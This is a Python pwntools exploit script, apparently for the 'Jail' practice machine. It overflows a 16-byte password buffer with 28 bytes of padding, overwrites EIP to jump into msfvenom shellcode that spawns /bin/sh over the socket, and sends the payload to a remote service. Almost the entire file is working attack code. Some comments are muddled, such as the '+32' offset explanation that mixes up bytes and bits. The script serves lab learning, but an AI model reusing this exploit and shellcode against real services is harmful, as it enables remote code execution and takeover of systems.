
import struct
from pwn import *

# this is the number you got from the
# pattern search/pattern create method
padding_before_register = 'A' * 28
# this is the value you want to put in the register to
# corrupt it.  In this case(the case for jail example), it's the EIP register
#  + CAREFUL, this could be big or little endian
#  + this also should be the location of the shell code in the final exploit
#  + by pointing it at the shell code, we'll get the reverse shell
# Why the +32
#  + because the address we have currently is the address of the userpass buffer
#  + currently the buffer is being overwritten with junk, so we're in the junk
#  + let me say that another way, currently, we're at the beginning of the userpass buffer 
#  + to get the buffer overflow, we must write 28 junk characters into the 16 character buffer
#  + once you are 28 spaces past you can put in your own memory address.  This address is another 4 bytes
#  + in size.  directly after this address you are overwriting is your shell code, so the address of the
#  + shell code is after the 4 bytes of memory you entered.  4 bytes is 32 bit, so we put a +32
# Why use the address of the userpass?
#  +  
value_to_overwrite_with = struct.pack("<I", 0xffffd610 + 32)

# This shell code was generated by msfvenom
# other shells could be generated, and I'm not sure this one will work
# you can also just google this stuff, it's pretty useful
shellcode = b""
shellcode += b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80";

payload = padding_before_register + value_to_overwrite_with + shellcode

# the below is specifc for the jail exploit
# it is simply connecting to the jail service, and
# inputting values for me so I don't have to manually 
# enter values in the terminal
r = remote('10.10.10.34', 7411)
r.sendline('DEBUG')
print(r.recv(1024))
r.sendline('USER admin')
print (r.recv(1024))
r.sendline('PASS ' + payload)
r.interactive()



